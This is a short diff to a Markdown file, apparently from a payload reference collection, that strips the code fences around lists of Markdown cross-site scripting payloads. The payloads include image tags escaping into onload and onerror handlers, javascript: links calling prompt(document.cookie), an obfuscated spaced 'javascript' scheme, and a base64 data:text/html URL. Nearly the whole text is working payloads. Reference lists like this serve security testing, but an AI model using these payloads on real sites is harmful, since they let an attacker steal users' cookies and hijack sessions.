@@ -12,14 +12,14 @@
 
 ## Images
 
-```markdown
+
 ![Escape SRC - onload](https://www.example.com/image.png"onload="alert('ImageOnLoad'))
 ![Escape SRC - onerror]("onerror="alert('ImageOnError'))
-```
+
 
 ## Fuzzing
 
-```markdown
+
 [XSS](javascript:prompt(document.cookie))
 [XSS](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
 [XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
@@ -46,4 +46,3 @@
 ![XSS](javascript:prompt(document.cookie))\
 ![XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\
 ![XSS'"`onerror=prompt(document.cookie)](x)\
-```
